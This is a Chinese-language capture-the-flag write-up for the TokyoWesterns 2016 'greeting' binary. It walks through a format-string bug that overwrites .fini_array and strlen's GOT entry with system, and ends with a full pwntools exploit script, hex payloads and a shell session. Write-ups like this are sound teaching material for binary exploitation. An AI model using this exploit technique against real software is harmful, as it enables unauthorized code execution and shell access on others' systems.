
# 考察点
- 格式化字符串漏洞进行任意地址写入
- 终止节`.fini_array`的特殊性。在 main 退出时，会执行，对其进行修改，可以劫持程序流，实现可控 loop back


# 分析

```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ checksec ./greeting                     
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting/greeting'
    Arch:       i386-32-little
    RELRO:      No RELRO    
    Stack:      Canary found    
    NX:         NX enabled      
    PIE:        No PIE (0x8048000)
    Stripped:   No
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ file ./greeting 
./greeting: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped    
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ ./greeting 
Hello, I'm nao!
Please tell me your name... 
Don't ignore me ;( 
                                                                                   
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ ./greeting
Hello, I'm nao!
Please tell me your name... Vict0ry
Nice to meet you, Vict0ry :)

┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ ./greeting
Hello, I'm nao!
Please tell me your name... AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Nice to meet you, AAAA.80487d0.fff1ecfc.a2783852.6400.f7f61a30.fffffba8.6563694e.206f7420.7465656d.756f7920.4141202c.252e4141.78252e78.2e78252e.252e7825.78252e78 :)

# fmt string 偏移为 12，内容为：4141202c。有两字节内容不一致，填充两字节在测试
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ ./greeting                     
Hello, I'm nao!
Please tell me your name... TTAAAA.%12$x
Nice to meet you, TTAAAA.41414141 :)
```


考察 fmtString 踩完点。然后丢 IDA，
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+1Ch] [ebp-84h] BYREF
  char input[64]; // [esp+5Ch] [ebp-44h] BYREF
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf("Please tell me your name... ");
  if ( !getnline(input, 64) )       // getline 获取输入
    return puts("Don't ignore me ;( ");
  sprintf(s, "Nice to meet you, %s :)\n", input);
  return printf(s);
}

// 进入 getnline
size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);   // 内层逻辑使 fgets
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s); // 返回读入内容的长度
}
```

正常思路是尝试使用格式字符串覆写某函数的GOT，在后续调用时会跳转到控制好的地址，**本例不一样，本例 main 在执行完 printf 之后就没有后续的显性调用**
```
.text:08048630                 mov     [esp+8], eax
.text:08048634                 mov     dword ptr [esp+4], offset aNiceToMeetYouS ; "Nice to meet you, %s :)\n"
.text:0804863C                 lea     eax, [esp+0A0h+s]
.text:08048640                 mov     [esp], eax      ; s
.text:08048643                 call    _sprintf
.text:08048648                 lea     eax, [esp+0A0h+s]
.text:0804864C                 mov     [esp], eax      ; format
.text:0804864F                 call    _printf
.text:08048654                 jmp     short loc_8048662
.text:08048656 ; ---------------------------------------------------------------------------
.text:08048656
.text:08048656 loc_8048656:                            ; CODE XREF: main+3D↑j
.text:08048656                 mov     dword ptr [esp], offset s ; "Don't ignore me ;( "
.text:0804865D                 call    _puts
.text:08048662
.text:08048662 loc_8048662（*）:                            ; CODE XREF: main+67↑j
.text:08048662                 mov     edx, [esp+9Ch]
.text:08048669                 xor     edx, large gs:14h
.text:08048670                 jz      short locret_8048677
.text:08048672                 call    ___stack_chk_fail    # ___stack_chk_fail 接续在 printf 函数之后调用，但该函数只当发生栈溢出才会被调用，因此不能成为覆写的目标
```

另外，IDA 在某处调用了 system 函数，参数不是 /bin/sh
```c
int nao()
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  return system("echo \"Hello, I'm nao\"!");
}
```

**思路：**
常规思路不起效，本例考察针对` 终止节.fini_array` 
- 利用格式化字符串覆写 `.fini_array终止节`指针-- 从而劫持程序流程
- 二次覆写某个函数地址为 system，随后传入"/bin/sh"，因此要求这个被覆写的函数和传入的内容相关 本例为 strlen


gdb 查看当前程序的 `.fini_array`
```shell
gef➤  info file
Symbols from "/home/pitta/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting/greeting".
Native process:
        Using the running image of child Thread 0xf7fc34c0 (LWP 43903).
        While running this, GDB does not access memory from...
Local exec file:
        `/home/pitta/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting/greeting', 
        ...
        0x08049934 - 0x08049938 is .fini_array  # pwn
        ...
```


将 `.fini_array` 覆写成 main 中的 getline 调用点，这样每次 main 终止之前都会 loop back 到这个位置(0x08048614)
```shell
gef➤  disas main
Dump of assembler code for function main:
   0x080485ed <+0>:     push   ebp
   0x080485ee <+1>:     mov    ebp,esp
   0x080485f0 <+3>:     and    esp,0xfffffff0
   0x080485f3 <+6>:     sub    esp,0xa0
   0x080485f9 <+12>:    mov    eax,gs:0x14
   0x080485ff <+18>:    mov    DWORD PTR [esp+0x9c],eax
   0x08048606 <+25>:    xor    eax,eax
   0x08048608 <+27>:    mov    DWORD PTR [esp],0x80487b3
   0x0804860f <+34>:    call   0x8048450 <printf@plt>
   0x08048614 <+39>:    mov    DWORD PTR [esp+0x4],0x40     # target loopback
   0x0804861c <+47>:    lea    eax,[esp+0x5c]
   0x08048620 <+51>:    mov    DWORD PTR [esp],eax
   0x08048623 <+54>:    call   0x8048679 <getnline>
```


涉及到的几个地址：
- .fini_array:  0x08049934  ->  gdb 中 info file
- getnline:     0x08048614  ->  gdb 中 disas main 得到
- strlenGOT:    0x08049a54  ->  readelf -r ./greeting
- systemCall:   0x08048490  ->  objdump -D greeting | grep system


# payload 说明

采取双字节为写入的单位，其中将`fini_array`覆写为 `main 中 getnline的位置` 因此使用 `%12$hn`，其余的同理
```shell
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ xxd ./test_payload/test1                          
00000000: 5454 3499 0408 2531 3224 686e            TT4...%12$hn
# gdb 调试 test1
gef➤  x/wx 0x08049934
0x8049934:      0x080485a0  # before printf
gef➤  x/wx 0x08049934
0x8049934:      0x08040018  # after printf
# 除去输入的 paading 两字节，地址四字节，输出了18字节内容，0x18（24） - 6 = 18
┌──(pitta㉿kali)-[~/workspace/pwn_learn/rec0rd/Tokyowesterns 2016 greeting]
└─$ xxd ./test_payload/test4                          
00000000: 5454 3499 0408 549a 0408 569a 0408 2533  TT4...T...V...%3
00000010: 3432 3932 6325 3132 2468 6e25 3635 3134  4292c%12$hn%6514
00000020: 3863 2531 3324 686e 2533 3336 3532 6325  8c%13$hn%33652c%
00000030: 3134 2468 6e                             14$hn
```
payload 包含两字节 padding， 3个四字节地址，共14字节，
0x8614 = 34324 - 32 = 34292
0x18490 = 99472 - 34324 = 65148
0x20804 = 133124 - 99472 = 33652

# gdb 验证
```shell
gef➤  x/wx 0x08049934
0x8049934:      0x08048614 
gef➤  x/wx 0x08049a54
0x8049a54 <strlen@got.plt>:     0x08048490


[#0] Id 1, Name: "greeting", stopped 0x8048490 in system@plt (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048490 → system@plt()   # 原先是 strlen
[#1] 0x80486c7 → getnline()
[#2] 0x8048628 → main()
```


# exp
```python
from pwn import *

# context.log_level = "debug"
pipe = process("./greeting")
# pipe = remote("127.0.0.1", 10001)

print(pipe.recvuntil("... "))

# addr to overwrite
fini_array = 0x08049934
strlenGOT = 0x08049a54

# overwrite to
addrGetnline = 0x8048614   
systemcall = 0x08048490 



payload = "TT"
payload += p32(fini_array).decode("iso-8859-1")      # 0x8614-18-14 = 34292
payload += p32(strlenGOT).decode("iso-8859-1")       # 0x18490-0x8614 = 65148
payload += p32(strlenGOT+2).decode("iso-8859-1")     # 0x20804 - 0x18490 = 33652
payload += "%34292c%12$hn"
payload += "%65148c%13$hn"
payload += "%33652c%14$hn"



pipe.sendline(payload)

pipe.sendline(b"/bin/sh")

pipe.interactive()

```
run exp.py
```shell
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 \x00 :)
$ ls
core    greeting  peda-session-dash.txt      README.md     test.py
exp.py  payload1  peda-session-greeting.txt  test_payload
$  
```

# 回顾
劫持终止节`.fini_array` 劫持回到 getnline，覆写 getnline.strlenGOT 使得每次 main 退出执行到的终止节都是回到 getnline，读入 shell命令，然后利用 strlenGOT 跳转 system 去执行。